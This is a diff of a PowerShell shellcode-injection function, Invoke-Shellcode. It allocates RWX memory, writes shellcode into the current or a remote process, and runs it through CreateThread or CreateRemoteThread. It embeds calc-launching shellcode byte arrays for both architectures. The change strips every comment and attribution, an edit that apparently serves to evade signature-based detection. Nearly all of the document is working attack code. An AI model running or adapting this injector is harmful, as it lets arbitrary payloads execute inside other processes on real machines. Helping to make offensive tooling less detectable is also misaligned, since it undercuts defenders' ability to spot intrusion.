@@ -1,6 +1,7 @@
 function Invoke-Shellcode
 {
 
+
 [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
     [ValidateNotNullOrEmpty()]
     [UInt16]
@@ -19,8 +20,7 @@ function Invoke-Shellcode
 
     if ( $PSBoundParameters['ProcessID'] )
     {
-        # Ensure a valid process ID was provided
-        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
+        
         Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
     }
     
@@ -67,23 +67,23 @@ function Invoke-Shellcode
             $Procedure
         )
 
-        # Get a reference to System.dll in the GAC
+        
         $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
             Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
         $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-        # Get a reference to the GetModuleHandle and GetProcAddress methods
+        
         $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-        # Get a handle to the module specified
+        
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
         
-        # Return the address of the function
+        
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
 
-    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
+    
     function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
     {
         $IntSizePtr = $Architecture / 8
@@ -101,23 +101,23 @@ function Invoke-Shellcode
         
         if ($IntSizePtr -eq 8)
         {
-            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
-            $CallStub += 0xFF,0xD0                              # CALL  RAX
-            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
-            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
-            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
-            $CallStub += 0xFF,0xD0                              # CALL  RAX
+            [Byte[]] $CallStub = 0x48,0xB8                      
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       
+            $CallStub += 0xFF,0xD0                              
+            $CallStub += 0x6A,0x00                              
+            $CallStub += 0x48,0xB8                              
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
+            $CallStub += 0xFF,0xD0                              
         }
         else
         {
-            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
-            $CallStub += 0xFF,0xD0                              # CALL  EAX
-            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
-            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
-            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
-            $CallStub += 0xFF,0xD0                              # CALL  EAX
+            [Byte[]] $CallStub = 0xB8                          
+            $CallStub += ConvertTo-LittleEndian $BaseAddr      
+            $CallStub += 0xFF,0xD0                            
+            $CallStub += 0x6A,0x00                             
+            $CallStub += 0xB8                                 
+            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr 
+            $CallStub += 0xFF,0xD0                              
         }
         
         Write-Output $CallStub
@@ -125,8 +125,8 @@ function Invoke-Shellcode
 
     function Local:Inject-RemoteShellcode ([Int] $ProcessID)
     {
-        # Open a handle to the process you want to inject into
-        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
+        
+        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 
         
         if (!$hProcess)
         {
@@ -135,16 +135,16 @@ function Invoke-Shellcode
 
         $IsWow64 = $false
 
-        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
+        if ($64bitOS) 
         {
-            # Determine if the process specified is 32 or 64 bit
+            
             $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
             
             if ((!$IsWow64) -and $PowerShell32bit)
             {
                 Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
             }
-            elseif ($IsWow64) # 32-bit Wow64 process
+            elseif ($IsWow64) 
             {
                 if ($Shellcode32.Length -eq 0)
                 {
@@ -155,7 +155,7 @@ function Invoke-Shellcode
                 Write-Verbose 'Injecting into a Wow64 process.'
                 Write-Verbose 'Using 32-bit shellcode.'
             }
-            else # 64-bit process
+            else 
             {
                 if ($Shellcode64.Length -eq 0)
                 {
@@ -166,7 +166,7 @@ function Invoke-Shellcode
                 Write-Verbose 'Using 64-bit shellcode.'
             }
         }
-        else # 32-bit CPU
+        else 
         {
             if ($Shellcode32.Length -eq 0)
             {
@@ -177,8 +177,8 @@ function Invoke-Shellcode
             Write-Verbose 'Using 32-bit shellcode.'
         }
 
-        # Reserve and commit enough memory in remote process to hold the shellcode
-        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
         
         if (!$RemoteMemAddr)
         {
@@ -187,29 +187,29 @@ function Invoke-Shellcode
         
         Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Copy shellcode into the previously allocated memory
+       
         $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
 
-        # Get address of ExitThread function
+        
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
 
         if ($IsWow64)
         {
-            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
+            
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
             
             Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
-            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
+            
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
             
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
-        # Allocate inline assembly stub
-        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) 
         
         if (!$RemoteStubAddr)
         {
@@ -218,10 +218,10 @@ function Invoke-Shellcode
         
         Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Write 32-bit assembly stub to remote process memory space
+        
         $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
 
-        # Execute shellcode as a remote thread
+       
         $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
         
         if (!$ThreadHandle)
@@ -229,7 +229,7 @@ function Invoke-Shellcode
             Throw "Unable to launch remote thread in PID: $ProcessID"
         }
 
-        # Close process handle
+        
         $CloseHandle.Invoke($hProcess) | Out-Null
 
         Write-Verbose 'Shellcode injection complete!'
@@ -259,8 +259,8 @@ function Invoke-Shellcode
             Write-Verbose 'Using 64-bit shellcode.'
         }
     
-        # Allocate RWX memory for the shellcode
-        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) 
         if (!$BaseAddress)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
@@ -268,10 +268,10 @@ function Invoke-Shellcode
         
         Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Copy shellcode to RWX buffer
+        
         [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
         
-        # Get address of ExitThread function
+        
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
         
         if ($PowerShell32bit)
@@ -287,8 +287,8 @@ function Invoke-Shellcode
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
-        # Allocate RWX memory for the thread call stub
-        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        
+        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40)
         if (!$CallStubAddress)
         {
             Throw "Unable to allocate thread call stub."
@@ -296,26 +296,26 @@ function Invoke-Shellcode
         
         Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Copy call stub to RWX buffer
+        
         [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
 
-        # Launch shellcode in it's own thread
+        
         $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
         {
             Throw "Unable to launch thread."
         }
 
-        # Wait for shellcode thread to terminate
+        
         $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
         
-        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null 
+        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null 
 
         Write-Verbose 'Shellcode injection complete!'
     }
 
-    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
+   
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
 
     $AddressWidth = $null
@@ -354,18 +354,13 @@ function Invoke-Shellcode
 
     if ($PSBoundParameters['Shellcode'])
     {
-        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
-        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
+        
         [Byte[]] $Shellcode32 = $Shellcode
         [Byte[]] $Shellcode64 = $Shellcode32
     }
     else
     {
-        # Pop a calc... or whatever shellcode you decide to place in here
-        # I sincerely hope you trust that this shellcode actually pops a calc...
-        # Insert your shellcode here in the for 0xXX,0xXX,...
-        # 32-bit payload
-        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
+        
         [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
@@ -380,8 +375,7 @@ function Invoke-Shellcode
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
 
-        # 64-bit payload
-        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
+        
         [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
@@ -403,7 +397,7 @@ function Invoke-Shellcode
 
     if ( $PSBoundParameters['ProcessID'] )
     {
-        # Inject shellcode into the specified process ID
+        
         $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
         $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
         $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
